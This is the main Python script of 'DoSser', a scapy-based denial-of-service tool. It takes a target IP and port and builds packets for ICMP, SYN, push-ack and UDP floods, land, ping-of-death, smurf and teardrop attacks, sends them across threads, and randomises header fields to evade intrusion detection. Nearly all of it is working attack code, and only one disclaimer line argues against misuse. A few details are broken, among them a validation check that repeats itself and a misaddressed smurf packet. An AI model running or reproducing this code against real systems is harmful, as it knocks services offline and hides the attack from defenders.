"""
This Script contains the core functionality of the program handling the GUI and the taking of arguments from the user.
Author: Joseph Whalley
Date: 8/5/23
Version: 1.6
"""

import argparse
import random
import string

from colorama import Fore
from scapy.layers.inet import IP, ICMP, TCP, UDP
from scapy.packet import fuzz
from scapy.volatile import RandShort

import teardropAttack
from utils import *


def loadgraphic():
    """
    Function to generate the program graphic and load text
    """
    logo = """
·▄▄▄▄        .▄▄ · .▄▄ · ▄▄▄ .▄▄▄
██▪ ██ ▪     ▐█ ▀. ▐█ ▀. ▀▄.▀·▀▄ █·
▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄
██. ██ ▐█▌.▐▌▐█▄▪▐█▐█▄▪▐█▐█▄▄▌▐█•█▌
▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀
    """

    startText = """
[+] A denial of service tool designed for the lazy network tester. Zzzz.
[+] V1.0 Designed by Joe Whalley.
[!] Please do not use this program for illegal or immoral purposes.
[?] Type "DoSSER --help" for instructions.
    """

    print(Fore.GREEN + logo)
    print(Fore.GREEN + startText)


def argparser():
    """
    Parser to take arguments off the user to generate there chosen attack. Makes use of the argparse module.
    """

    # Create the parser object
    parser = argparse.ArgumentParser(
        prog='DoSser',
        description='A tool designed by Joseph Whalley to preform a range of Denial of Service attacks against a '
                    'target. '
    )
    parser.add_argument("-t", "--target", required=True, type=str, help="Target IP address.")
    parser.add_argument("-p", "--port", required=True, type=int, help="Target Port. Must be a positive integer.")
    parser.add_argument("-th", "--threads", default=4, type=int,
                        help="Amount of threads to use in an attack. Default 4. Must be a positive integer greater "
                             "than 0.")
    parser.add_argument("-a", "--attack", required=True,
                        choices=['icmpflood', 'land', 'pingofdeath', 'tcppushack', 'tcpsyn', 'teardrop', 'udpflood',
                                 'smurf'], help='Choose the type of attack to perform on '
                                                'the target. See '
                                                'README for descriptions.')

    # Limit subparser
    limit_subparsers = parser.add_subparsers(title='limits', dest='limit', required=True)

    # Time subparser
    time_parser = limit_subparsers.add_parser('time', help='Limit the attack by time')
    time_parser.add_argument('value', type=int,
                             help='Length of time to run the attack for. Must be a positive integer. Set to 0 for '
                                  'infinite.')

    # Packet subparser
    packet_parser = limit_subparsers.add_parser('packet', help='Limit the amount of packets to send.')
    packet_parser.add_argument('value', type=int,
                               help='Amount of packets to send in the attack per thread. Must be a positive integer.')

    args = parser.parse_args()

    return args


def main():
    """
    Each attack method with required packet pre-crafted to preform attack. Has the logic to decide between attacks and
    is the 'main' part of the code.
    Contains obfuscation in headers to help avoid detection by IDS software etc.
    """
    args = argparser()  # Get parsed arguments
    loadgraphic()  # Output Loading graphic and text

    # Value checks
    if (args.value < 0) or args.value < 0:
        print("[!] Invalid value set on Port or Limit value flag.")
        sys.exit(0)

    if args.threads < 1:
        print("[!] Invalid value set on Threads flag.")
        sys.exit(0)

    if args.attack == 'icmpflood':
        packet = IP(dst=args.target, id=random.randint(1, 10000), ttl=random.randint(32, 64)) / ICMP() / (
                random.choice(string.ascii_uppercase + string.ascii_lowercase) * 64)
        thread_packets(packet, args.threads, args.limit, args.value)

    elif args.attack == 'land':
        packet = IP(src=args.target, dst=args.target, id=random.randint(1, 10000), ttl=random.randint(32, 64)) / TCP(
            sport=args.port, dport=args.port, flags="S")
        thread_packets(packet, args.threads, args.limit, args.value)

    elif args.attack == "pingofdeath":
        packet = IP(dst=args.target, id=random.randint(1, 10000), ttl=random.randint(32, 64)) / ICMP() / (
                random.choice(string.ascii_uppercase + string.ascii_lowercase) * 60000)
        thread_packets(packet, args.threads, args.limit, args.value)

    elif args.attack == "tcppushack":
        packet = IP(dst=args.target, id=random.randint(1, 10000), ttl=random.randint(32, 64)) / TCP(sport=RandShort(),
                                                                                                    dport=args.port,
                                                                                                    flags="PA")
        thread_packets(packet, args.threads, args.limit, args.value)

    elif args.attack == "tcpsyn":
        packet = IP(dst=args.target, id=random.randint(1, 10000), ttl=random.randint(32, 64)) / TCP(sport=RandShort(),
                                                                                                    dport=args.port,
                                                                                                    flags="S")
        thread_packets(packet, args.threads, args.limit, args.value)

    elif args.attack == "udpflood":
        packet = IP(dst=args.target, id=random.randint(1, 10000), ttl=random.randint(32, 64)) / fuzz(
            UDP(dport=args.port))
        thread_packets(packet, args.threads, args.limit, args.value)

    elif args.attack == "teardrop":
        teardropAttack.teardrop_attack(args.target, args.port, args.limit, args.value)

    elif args.attack == "smurf":
        packet = IP(src=args.target, dst=get_my_ip()) / ICMP()
        thread_packets(packet, args.threads, args.limit, args.value)
    else:
        args.print_help()
        sys.exit(1)


if __name__ == "__main__":
    # Call the main function
    main()
